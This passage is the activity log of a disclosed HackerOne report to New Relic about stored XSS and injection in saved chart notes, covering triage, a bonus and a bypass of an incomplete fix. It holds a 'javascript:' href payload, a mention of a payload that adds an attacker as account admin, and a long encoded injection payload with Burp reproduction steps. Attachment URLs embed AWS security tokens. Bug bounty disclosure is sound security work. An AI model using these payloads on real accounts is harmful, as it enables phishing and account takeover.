profile?","automated_response":false,"created_at":"2019-03-14T22:01:39.123Z","updated_at":"2019-03-14T22:01:39.123Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4326250,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I do not know how to do this exactly, but this hacker https://hackerone.com/jon_bottarini has a note from your program in his profile. At the section `what programs say`. If it is early for me to ask you about this, I can reach you again with this after few more reports submitted ;)","automated_response":false,"created_at":"2019-03-14T22:04:11.154Z","updated_at":"2019-03-14T22:04:11.154Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4326272,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I *think* this is something that can be added when a report is resolved. But let's have you submit a few more reports like this before we sing your praises publicly ;)","automated_response":false,"created_at":"2019-03-14T22:08:56.752Z","updated_at":"2019-03-14T22:08:56.752Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4326282,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK @dday, thanks, I glad to work with you :)","automated_response":false,"created_at":"2019-03-14T22:10:37.829Z","updated_at":"2019-03-14T22:10:37.829Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4663444,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ask and you shall receive ;) Your profile looks much cooler now:\n\n{F478260}\n","automated_response":false,"created_at":"2019-04-29T17:34:59.369Z","updated_at":"2019-04-29T17:34:59.369Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":478260,"filename":"Screen_Shot_2019-04-29_at_10.33.58_AM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/478/260/c6e94fc83213274c8733ab68f022a3762d927ee0/Screen_Shot_2019-04-29_at_10.33.58_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-29_at_10.33.58_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-29_at_10.33.58_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150743Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=709f9d1680fef022ea4b206f92d876324c8fa4df919ac8a38731a937132de7ac"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4664402,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you so much @dday :)","automated_response":false,"created_at":"2019-04-29T17:55:53.097Z","updated_at":"2019-04-29T17:55:53.097Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4686982,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @dday, \n\nCan you somehow provide the unlimited trial accounts for me? Or maybe open all features support to the accounts I own? I see the label \"This feature isn't available at your current subscription level\" relatively often and it takes time to register new accounts every time the trial is ended. Thanks for reply!","automated_response":false,"created_at":"2019-04-30T13:03:11.235Z","updated_at":"2019-04-30T13:03:11.235Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5619944,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@skavans, I retested this... a bit: I get a 403 for the data_url for a chart that does not below to the account. I cannot get the XSS to pop on the `number_suffix`. It appears they removed the `subtitle`. Please retest and reopen the ticket if you find anything else (bonuses will be in order if you do)!","automated_response":false,"created_at":"2019-08-20T18:21:00.649Z","updated_at":"2019-08-20T18:21:00.649Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"skavans","url":"/skavans"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5629514,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Thank you for giving me a non-malicious subtitle to test. I'll see if I can reproduce this now and award you a bonus if I can.","automated_response":false,"created_at":"2019-08-21T16:29:26.227Z","updated_at":"2019-08-21T16:29:26.227Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5629557,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jmcaleer, apologies for creating a redundant report instead of reopening this one. I don't know how to reopen the reports here (I think, I can't).","automated_response":false,"created_at":"2019-08-21T16:31:48.957Z","updated_at":"2019-08-21T16:31:48.957Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5629668,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It turns out you can't reopen it. Sorry about that, I've never been on that side of the site. Just comment on any that we've closed and we'll come back to them! This was a new decision to handle bypasses so that we could keep track of them, so I appreciate you finding a way to let us know! I'm trying to reproduce this now.","automated_response":false,"created_at":"2019-08-21T16:41:33.190Z","updated_at":"2019-08-21T16:41:48.910Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5629692,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@skavans, Good find! I was able to reproduce this. Was having trouble with testing the subtitle before because I had to create my own, otherwise I was adding some attacker@skavans.ru as an admin to my account. :D","automated_response":false,"created_at":"2019-08-21T16:47:30.656Z","updated_at":"2019-08-21T16:47:30.656Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5629706,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jmcaleer, I know now that your policy changed and you ask to provide the non-dangerous payloads, so I will be compliant further :)","automated_response":false,"created_at":"2019-08-21T16:50:29.713Z","updated_at":"2019-08-21T16:50:29.713Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5629899,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@skavans Real quick before I decide this is a vulnerability. I did not get an alert box to come up. So while, the text can be added, does the javascript actually execute?","automated_response":false,"created_at":"2019-08-21T16:58:32.833Z","updated_at":"2019-08-21T16:58:32.833Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5629936,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jmcaleer, Yes, it executes.\nYou should click the text to execute it.\n\n{F561408}","automated_response":false,"created_at":"2019-08-21T17:04:27.893Z","updated_at":"2019-08-21T17:15:42.154Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":561408,"filename":"______________2019-08-21___20.01.13.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mcG4fFzEHcEh8feGFWHev8pB?response-content-disposition=attachment%3B%20filename%3D%22______________2019-08-21___20.01.13.mov%22%3B%20filename%2A%3DUTF-8%27%27______________2019-08-21___20.01.13.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150743Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f629928e51604066fd23a583ed2b773846a9a142ba7a6d06e0967040e8d98747"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5630039,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I'll have you know I tried to test it with your previous javascript for subtitle (but replacing my own user) and that didn't seem to work. I think you might have the magic touch. Thank you for working with me again, @skavans. Always appreciate your work.","automated_response":false,"created_at":"2019-08-21T17:17:32.718Z","updated_at":"2019-08-21T17:17:32.718Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5630089,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jmcaleer Glad to hear that it works! I'll try to craft the simpler payloads further to avoid the reproducing difficulties at your end.","automated_response":false,"created_at":"2019-08-21T17:22:45.876Z","updated_at":"2019-08-21T17:22:45.876Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5630257,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"{F561433}","automated_response":false,"created_at":"2019-08-21T17:34:22.308Z","updated_at":"2019-08-21T17:34:22.308Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"625.0","attachments":[{"id":561433,"filename":"sloth_money.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MrVLiyokdNjoALkwaC6WbweS?response-content-disposition=attachment%3B%20filename%3D%22sloth_money.gif%22%3B%20filename%2A%3DUTF-8%27%27sloth_money.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150743Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=81f202ad2e8eb0b428a6c69d39ef8690ef41ae2d07e14d093bf9ae5e5a2ae0cd"}],"genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"skavans","url":"/skavans"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5630264,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for a gorgeous bonus ;)","automated_response":false,"created_at":"2019-08-21T17:35:38.189Z","updated_at":"2019-08-21T17:35:38.189Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5837189,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@skavans \n\nI believe this may be resolved. It's solved in a very curious way: The href link is now forced to be after `https://rpm.newrelic.com/accounts/{account_id}/notes`. For example, `\"href\":\"javascript:alert()\"` now turns into `https://rpm.newrelic.com/accounts/{account_id}/notes/javascript%20alert()`. However, this returns a 404 page. I have not been able to get around this, so I would be very pleased if you find a way around it! Thank you so much for your work.","automated_response":false,"created_at":"2019-09-18T16:02:57.265Z","updated_at":"2019-09-18T16:02:57.265Z","actor":{"username":"jmcaleer","cleared":false,"url":"/jmcaleer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"skavans","url":"/skavans"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5839638,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jmcaleer,\n\nThe issue isn't resolved properly. The core vulnerability cause is that `\u0026quot;` escape sentence is HTML-decoded and breaks the resulting JSON becoming the `\"` inside server response, which gives an attacker the opportunity to inject arbitrary chart attributes. Instead of fixing the core cause, the devs have added the replace rule changing the `javascript:` to `javascript ` (with the space sign at the end). That's why you observed the behavior above: the link `javascript alert()` considers as internal link by browser so it tries to load `https://rpm.newrelic.com/accounts/{account_id}/notes/javascript%20alert()`.\n\nBut attacker still can, for instance, use a regular links to perform a phishing attack against the victim. This is how you can reproduce this case:\n1) Sign into New Relic app with some account (attacker)\n2) Save any chart to notes and intercept the saving request using some intercepting proxy tool (e.g. Burp Suite)\n3) Find parameter `note_item%5Bdata_url%5D`, then find any `%26` inside it and replace it with\n```\n%26%73%75%62%74%69%74%6c%65%3d%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%37%32%25%36%35%25%36%34%25%36%39%25%37%34%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%35%25%36%65%25%36%31%25%36%32%25%36%63%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%38%25%37%32%25%36%35%25%36%36%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%36%37%25%36%66%25%36%66%25%36%37%25%36%63%25%36%35%25%32%65%25%36%33%25%36%66%25%36%64%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%35%25%37%38%25%37%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%33%25%36%66%25%36%64%25%36%35%25%37%34%25%36%38%25%36%39%25%36%65%25%36%37%25%32%30%25%36%39%25%37%33%25%32%30%25%37%37%25%37%32%25%36%66%25%36%65%25%36%37%25%32%30%25%36%31%25%37%34%25%32%30%25%36%66%25%37%35%25%37%32%25%32%30%25%36%35%25%36%65%25%36%34%25%32%65%25%32%30%25%35%30%25%36%63%25%36%35%25%36%31%25%37%33%25%36%35%25%32%30%25%36%33%25%36%63%25%36%39%25%36%33%25%36%62%25%32%30%25%36%38%25%36%35%25%37%32%25%36%35%25%32%30%25%37%34%25%36%66%25%32%30%25%37%32%25%36%35%25%37%34%25%37%32%25%37%39%25%32%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%33%25%37%34%25%37%39%25%36%63%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%66%25%36%63%25%36%66%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%32%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%36%25%36%66%25%36%65%25%37%34%25%35%33%25%36%39%25%37%61%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%32%25%33%30%25%37%30%25%37%38%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%35%25%36%65%25%37%34%25%36%35%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%36%25%36%35%25%37%32%25%37%34%25%36%39%25%36%33%25%36%31%25%36%63%25%34%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%66%25%37%30%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%33%33%25%33%30%25%37%64%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%26\n```\n4) Send edited request.\n5) Open the newest note and make sure it contains a red credits link at the top of chart.\n6) Press the link and make sure you are redirected to `google.com`\n\nAttacker can also use `data:` URIes and any other schemes, because the `javascipt:` is only thing to be replaced. And he maybe still can perform an XSS, because the arbitrary chart parameters still could be injected into the server response (but it can take a long to find another place to inject a payload (w/o using the javascript: link), so I think you agree that an active link is sufficient proof of the fact that the issue are not fixed correctly).\n\nIf I should find a bypass exactly leading to XSS, to issue be reopened, I can report this one as HTML-injection separately, and try to find a full bypass. But please believe, the fix is 